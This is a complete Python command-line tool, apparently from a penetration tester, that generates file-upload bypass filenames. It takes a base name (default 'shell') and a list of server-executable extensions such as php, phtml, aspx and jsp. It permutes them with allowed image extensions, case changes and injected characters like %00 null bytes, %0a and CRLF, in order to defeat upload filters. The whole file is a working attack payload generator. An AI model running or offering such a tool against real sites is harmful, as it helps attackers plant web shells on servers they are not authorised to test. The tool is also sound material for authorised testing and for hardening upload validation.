#!/usr/bin/env python3
"""
uploadgen - file-upload bypass filename generator.

Generates filename permutations for testing upload filters: it injects
bypass characters around an executable extension and a benign (allowed)
extension, in every position. Pick the backend language and the tool pulls
the right set of executable extensions automatically.

Author: rdw  (rdwsec.github.io)
Use only against systems you are authorised to test.
"""

import argparse
import sys

# Backend language -> executable extensions a server might run.
EXT_MAP = {
    "php":  ["php", "php3", "php4", "php5", "php7", "pht", "phtml", "phar", "phps"],
    "asp":  ["asp", "aspx", "ashx", "asmx", "asax", "cer", "asa"],
    "jsp":  ["jsp", "jspx", "jspf", "jsw", "jsv"],
    "perl": ["pl", "pm", "cgi"],
    "cf":   ["cfm", "cfml", "cfc"],
    "py":   ["py"],   # note: servers rarely execute uploaded .py directly
    "node": ["js"],   # note: same caveat as python
}

# Characters injected around the extensions to confuse the filter/parser.
DEFAULT_CHARS = ["%20", "%0a", "%00", "%0d%0a", "/", ".\\", ".", "\u2026", ":"]


def parse_args():
    p = argparse.ArgumentParser(
        description="Generate file-upload bypass filenames.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--lang", default="php",
                   help="Backend language(s), comma-separated, or 'all' "
                        "(e.g. php,asp). Options: " + ", ".join(EXT_MAP))
    p.add_argument("--allowed", default="jpg",
                   help="Allowed/benign extension(s), comma-separated (e.g. jpg,png)")
    p.add_argument("--name", default="shell", help="Base filename")
    p.add_argument("--chars", default=None,
                   help="Override bypass chars, comma-separated. Default uses a built-in set.")
    p.add_argument("--case", action="store_true",
                   help="Also emit upper/mixed-case exec extensions (.PHP, .Php)")
    p.add_argument("--no-baseline", action="store_true",
                   help="Skip the plain double-extension/raw entries (char-injected only)")
    p.add_argument("--list-langs", action="store_true", help="List supported languages and exit")
    p.add_argument("-o", "--output", default=None,
                   help="Write to file (default: print to stdout)")
    return p.parse_args()


def resolve_langs(arg):
    if arg.strip().lower() == "all":
        return list(EXT_MAP)
    chosen = []
    for l in arg.split(","):
        l = l.strip().lower()
        if not l:
            continue
        if l not in EXT_MAP:
            sys.stderr.write(f"[!] Unknown language '{l}'. Known: {', '.join(EXT_MAP)}\n")
            sys.exit(1)
        chosen.append(l)
    return chosen


def case_variants(ext):
    """Return [ext, EXT, Ext] without duplicates."""
    out, seen = [], set()
    for v in (ext, ext.upper(), ext.capitalize()):
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def generate(args):
    langs = resolve_langs(args.lang)
    allowed = [a.strip().lstrip(".") for a in args.allowed.split(",") if a.strip()]
    chars = ([c for c in args.chars.split(",")] if args.chars else DEFAULT_CHARS)
    name = args.name

    exec_exts = []
    for lang in langs:
        for e in EXT_MAP[lang]:
            exec_exts.extend(case_variants(e)) if args.case else exec_exts.append(e)

    results, seen = [], set()

    def add(fn):
        if fn not in seen:
            seen.add(fn)
            results.append(fn)

    for ex in exec_exts:
        ex = "." + ex
        for al in allowed:
            al = "." + al
            # baseline payloads (no injected char)
            if not args.no_baseline:
                add(f"{name}{ex}")              # shell.php
                add(f"{name}{ex}{al}")          # shell.php.jpg
                add(f"{name}{al}{ex}")          # shell.jpg.php
            # char-injected permutations (the four placements)
            for ch in chars:
                add(f"{name}{ch}{ex}{al}")      # shell%20.php.jpg
                add(f"{name}{ex}{ch}{al}")      # shell.php%20.jpg
                add(f"{name}{al}{ch}{ex}")      # shell.jpg%20.php
                add(f"{name}{al}{ex}{ch}")      # shell.jpg.php%20
    return results


def main():
    args = parse_args()
    if args.list_langs:
        for k, v in EXT_MAP.items():
            print(f"{k:6} {', '.join(v)}")
        return
    results = generate(args)
    if args.output:
        with open(args.output, "w") as f:
            f.write("\n".join(results) + "\n")
        sys.stderr.write(f"[*] Wrote {len(results)} filenames to {args.output}\n")
    else:
        print("\n".join(results))
        sys.stderr.write(f"[*] Generated {len(results)} filenames\n")


if __name__ == "__main__":
    main()
